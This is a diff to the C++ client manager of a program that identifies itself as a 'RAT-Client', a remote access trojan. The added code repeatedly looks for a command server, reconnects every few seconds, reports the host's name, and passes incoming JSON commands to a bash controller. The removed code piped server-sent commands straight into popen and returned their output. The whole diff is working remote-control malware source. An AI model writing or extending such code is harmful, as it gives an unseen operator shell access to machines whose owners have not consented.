@@ -1,8 +1,15 @@
 #include "ClientManager.hpp"
+#include "ClientPingController.hpp"
+#include "ClientBashController.hpp"
 #include <iostream>
 #include <thread>
 #include <cstdio>
 #include <cerrno>
+#include <cstring>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <map>
+#include <memory>
 
 namespace Client {
 
@@ -28,7 +35,11 @@ ClientManager::~ClientManager() {
 
 bool ClientManager::connectTo(const std::string &name, const sf::IpAddress &address, unsigned short port) {
     std::lock_guard<std::mutex> lock(mtx_);
-    if (socket_) return false; 
+    
+    if (name.empty()) return false;
+    if (port == 0) return false;
+    if (socket_) return false;
+    
     socket_ = std::make_shared<Utils::TCPSocket>();
     if (!socket_->connect(address, port)) {
         socket_.reset();
@@ -65,47 +76,67 @@ ClientController *ClientManager::getController(const std::string &name) {
 
 int ClientManager::run(const sf::IpAddress &address, unsigned short port) {
     const std::string name = "main";
-    if (!connectTo(name, address, port)) return 1;
+    
+    ClientPingController pingCtrl;
+    unsigned short udpPort = port;
+    
+    while (true) {
+        if (pingCtrl.discoverServer(address, udpPort, 3, 300)) {
+            if (connectTo(name, address, port)) break;
+        }
+        std::this_thread::sleep_for(std::chrono::seconds(3));
+    }
+    
     ClientController *ctrl = getController(name);
     if (!ctrl) return 2;
 
-    
+    // Trimitere mesaj inițial cu informații despre client
     nlohmann::json out;
+    out["controller"] = "system";
     out["msg"] = "Hello from RAT-Client";
+    out["version"] = "1.0";
+    char hostname[256] = {0};
+    if (gethostname(hostname, sizeof(hostname)) == 0) {
+        out["hostname"] = std::string(hostname);
+    }
     if (!ctrl->sendJson(out)) {
         disconnect(name);
         return 3;
     }
 
-    
+    std::map<std::string, std::unique_ptr<IClientController>> clientControllers;
+    clientControllers["bash"] = std::make_unique<ClientBashController>();
+
     while (isConnected(name)) {
         nlohmann::json in;
         if (!ctrl->receiveJson(in)) {
-            
             std::this_thread::sleep_for(std::chrono::milliseconds(100));
             continue;
         }
         
-        if (in.contains("cmd") && in["cmd"].is_string()) {
-            std::string cmd = in["cmd"].get<std::string>();
+        if (in.contains("controller") && in["controller"].is_string() && 
+            in["controller"].get<std::string>() == "ping") {
+            continue;
+        }
+        
+        if (in.contains("controller") && in["controller"].is_string()) {
+            std::string controllerHandle = in["controller"].get<std::string>();
             
-            if (cmd == "exit") break;
-            
-            std::string output;
-            int retcode = 0;
-            FILE *p = popen(cmd.c_str(), "r");
-            if (!p) {
-                output = std::string("popen failed: ") + std::strerror(errno);
-                retcode = -1;
-            } else {
-                char buf[512];
-                while (fgets(buf, sizeof(buf), p) != nullptr) {
-                    output += buf;
+            auto it = clientControllers.find(controllerHandle);
+            if (it != clientControllers.end()) {
+                nlohmann::json reply = it->second->handleCommand(in);
+                ctrl->sendJson(reply);
+                
+                if (reply.contains("exit") && reply["exit"].is_boolean() && reply["exit"].get<bool>()) {
+                    break;
                 }
-                retcode = pclose(p);
+            } else {
+                nlohmann::json reply;
+                reply["controller"] = "error";
+                reply["out"] = "Unknown controller: " + controllerHandle;
+                reply["ret"] = -1;
+                ctrl->sendJson(reply);
             }
-            nlohmann::json reply{ {"out", output}, {"ret", retcode} };
-            ctrl->sendJson(reply);
         }
     }
 
